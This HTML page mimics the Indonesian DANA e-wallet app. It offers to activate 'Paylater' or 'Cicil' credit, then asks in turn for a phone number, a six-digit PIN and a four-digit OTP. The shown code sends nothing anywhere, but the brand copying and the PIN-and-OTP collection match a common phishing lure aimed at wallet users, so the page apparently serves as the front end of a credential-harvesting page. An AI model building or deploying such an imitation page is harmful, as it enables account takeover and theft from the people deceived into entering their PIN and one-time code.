<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>DANA Ultra UI</title>

<style>
body {
  margin: 0;
  font-family: 'Segoe UI', sans-serif;
  background: #f1f3f6;
  overflow-x: hidden;
}

/* SPLASH */
.splash {
  position: fixed;
  width: 100%;
  height: 100%;
  background: #118acb;
  display: flex;
  justify-content: center;
  align-items: center;
  flex-direction: column;
  color: white;
  z-index: 999;
}
.logo { font-size: 42px; font-weight: bold; }
.loader {
  margin-top: 20px;
  width: 40px; height: 40px;
  border: 4px solid rgba(255,255,255,0.3);
  border-top: 4px solid white;
  border-radius: 50%;
  animation: spin 1s linear infinite;
}
@keyframes spin { to { transform: rotate(360deg);} }

/* APP */
.app {
  max-width: 400px;
  margin: auto;
  position: relative;
  overflow: hidden;
}

/* SLIDER */
.wrapper {
  display: flex;
  width: 300%;
  transition: 0.4s ease;
}
.screen {
  width: 100%;
  padding: 20px;
}

/* HEADER */
.header {
  background: #118acb;
  color: white;
  padding: 20px;
  border-radius: 0 0 20px 20px;
}

/* CARD */
.card {
  background: white;
  border-radius: 16px;
  padding: 15px;
  margin-top: -20px;
}
.option {
  border: 2px solid #eee;
  padding: 12px;
  border-radius: 12px;
  margin-bottom: 10px;
}
.option.active { border-color: #118acb; }

/* BUTTON */
.btn {
  width: 100%;
  padding: 14px;
  border-radius: 12px;
  border: none;
  background: #118acb;
  color: white;
  font-size: 16px;
  margin-top: 20px;
}

/* INPUT */
.input {
  width: 100%;
  padding: 12px;
  border-radius: 10px;
  border: 1px solid #ddd;
}

/* PIN */
.pin {
  display: flex;
  justify-content: space-between;
  margin-top: 20px;
}
.pin input {
  width: 45px;
  height: 50px;
  text-align: center;
  font-size: 20px;
  border-radius: 10px;
  border: 1px solid #ddd;
}

/* SHAKE */
.shake {
  animation: shake 0.3s;
}
@keyframes shake {
  0%{transform:translateX(0)}
  25%{transform:translateX(-5px)}
  50%{transform:translateX(5px)}
  75%{transform:translateX(-5px)}
  100%{transform:translateX(0)}
}

/* OTP */
.sheet {
  position: fixed;
  bottom: -100%;
  left: 0;
  width: 100%;
  background: white;
  border-radius: 20px 20px 0 0;
  padding: 20px;
  transition: 0.4s;
  text-align: center;
}
.sheet.active { bottom: 0; }
.small { color: #666; margin-top: 10px; }
</style>
</head>

<body>

<!-- SPLASH -->
<div class="splash" id="splash">
  <div class="logo">DANA</div>
  <div class="loader"></div>
</div>

<div class="app" id="app" style="display:none;">

  <div class="wrapper" id="wrap">

    <!-- SCREEN 1 -->
    <div class="screen">
      <div class="header"><h3>Pilih Kebutuhan</h3></div>
      <div class="card">
        <div class="option active">Aktifkan Dana Paylater</div>
        <div class="option">Aktifkan Dana Cicil</div>
        <div class="option">Laporkan Kendala</div>
      </div>
      <button id="btn1" class="btn">Konfirmasi</button>
    </div>

    <!-- SCREEN 2 -->
    <div class="screen">
      <input id="phone" class="input" placeholder="+62 812xxxx">
      <button id="btn2" class="btn" disabled>Lanjut</button>
    </div>

    <!-- SCREEN 3 -->
    <div class="screen">
      <div class="pin" id="pin">
        <input maxlength="1"><input maxlength="1"><input maxlength="1">
        <input maxlength="1"><input maxlength="1"><input maxlength="1">
      </div>
      <button id="btn3" class="btn">Verifikasi</button>
    </div>

  </div>
</div>

<!-- OTP -->
<div class="sheet" id="otp">
  <h3>Masukkan OTP</h3>
  <div class="pin">
    <input maxlength="1"><input maxlength="1"><input maxlength="1"><input maxlength="1">
  </div>
  <div class="small" id="timer">Kirim ulang (60s)</div>
</div>

<script>
setTimeout(()=>{
  splash.style.display='none';
  app.style.display='block';
},2000);

const wrap = document.getElementById("wrap");

// NAVIGASI
btn1.onclick = ()=> wrap.style.transform="translateX(-100%)";
btn2.onclick = ()=> wrap.style.transform="translateX(-200%)";

// FORMAT HP
phone.oninput = ()=>{
  let v = phone.value.replace(/\\D/g,'');
  if(!v.startsWith('62')) v='62'+v;
  phone.value = '+'+v;
  btn2.disabled = v.length < 10;
};

// PIN
const pins = document.querySelectorAll("#pin input");

pins.forEach((el,i)=>{
  el.oninput = ()=>{
    if(el.value && i<5) pins[i+1].focus();
  };
});

// VERIFY
btn3.onclick = ()=>{
  const empty = [...pins].some(i=>!i.value);
  if(empty){
    document.getElementById("pin").classList.add("shake");
    navigator.vibrate(200);
    setTimeout(()=>pin.classList.remove("shake"),300);
  } else {
    otp.classList.add("active");
  }
};

// TIMER
let t=60;
setInterval(()=>{
  if(t>0){
    t--;
    timer.innerText=`Kirim ulang (${t}s)`;
  }
},1000);
</script>

</body>
</html>
